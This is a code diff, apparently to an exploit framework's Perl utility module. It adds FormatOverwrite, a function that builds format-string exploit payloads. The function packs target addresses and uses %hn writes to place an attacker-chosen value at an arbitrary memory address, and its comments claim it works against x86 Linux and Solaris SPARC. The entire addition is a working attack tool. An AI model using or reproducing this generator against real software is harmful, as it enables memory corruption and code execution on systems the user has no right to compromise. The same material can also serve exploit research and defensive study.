@@ -401,4 +401,50 @@ sub Rev2Ver {
   return ($rev) ? $rev : '0.0';  
 }
 
+
+# fmt string generator using %hn, seems to work fine against x86 linux
+# and solaris sparc, takes where and what (obvious), offset to the dword
+# of controlled (beginning of fmt usually), and before which is the number
+# of characters printed before our controlled part of the fmt string
+# Some ideas taken from Pappy & Zorgon
+
+sub FormatOverwrite {
+  my %opts = @_;
+  $opts{'pack'} = 'V' if(!exists($opts{'pack'}));
+  $opts{'offset'} = 0 if(!exists($opts{'offset'}));
+  $opts{'before'} = 0 if(!exists($opts{'before'}));
+  my $pack   = $opts{'pack'};
+  my $what   = $opts{'what'};
+  my $where  = $opts{'where'};
+  my $offset = $opts{'offset'};
+  my $before = $opts{'before'};
+  my $string;
+
+
+  # For big/little endian difference you could also swap the order
+  # of the where and where + 2, but I just do what change because
+  # um, yeah
+  $string .= pack($pack, $where) . pack($pack, $where + 2);
+  my $first = $pack eq 'N' ? 
+    ($what >> 16)    - $before - 8 : # Big endian write the high 16
+    ($what & 0xffff) - $before - 8;  # Little endian write the low 16
+
+  while($first < 8) {
+    $first += 0x10000;
+  }
+  $string .= '%.' . $first . 'x%' . $offset . '$hn';
+  my $second = $pack eq 'N' ?
+    ($what & 0xffff) - $first - 8 : # And so on
+    ($what >> 16)    - $first - 8;
+
+#  print STDERR "Second before $second\n";
+  while($second < 8) {
+    $second += 0x10000;
+  }
+#  print STDERR "Second after $second\n";
+  $string .= '%.' . $second . 'x%' . ($offset + 1) . '$hn';
+
+  return($string);
+}
+
 1;
